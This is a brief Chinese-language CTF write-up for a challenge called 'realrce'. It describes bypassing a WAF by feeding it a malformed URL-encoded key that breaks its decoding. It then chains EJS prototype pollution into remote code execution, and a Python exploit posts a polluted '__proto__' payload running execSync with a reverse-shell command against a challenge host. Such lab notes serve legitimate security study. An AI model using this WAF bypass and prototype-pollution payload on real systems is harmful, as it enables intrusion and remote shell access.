# realrce
	- 思路
		- 让WAF产生错误而绕过WAF，并使用ejs原型链污染实现RCE
	- 绕过WAF
		- 看到WAF会对url解码，在解码失败时直接返回false
		- 这就可以使用`"trickwaf%00%%%"`让WAF在urldecode时产生错误，从而使其返回False, 实现RCE
	- EJS原型链污染
		- [[CTFWEB/JS/EJS的原型链污染]]直接打
	- exp
		- ```python
		  ejs_escape = """\
		  function escapeXMLToString() {
		    return Function.prototype.toString.call(this) + ';\\n' + escapeFuncStr;
		  }
		  console.log('114514ejs');
		  process.mainModule.require('child_process').execSync(CMD);
		  \
		  """.replace("CMD", repr(reverse_shell_payload))
		  
		  url = "http://f63b9588-d130-496d-ae65-b4578c85ca39.node4.buuoj.cn:81/"
		  r = base_post(url, json = {
		      "msg": {
		          "__proto__": {
		              "settings": {
		                  "view options": {
		                      "client": "1",
		                      "escape": ejs_escape,
		                  }
		              }
		          },
		          "trickwaf%00%%%": 114514
		      }
		  })
		  print(r.text)
		  
		  ```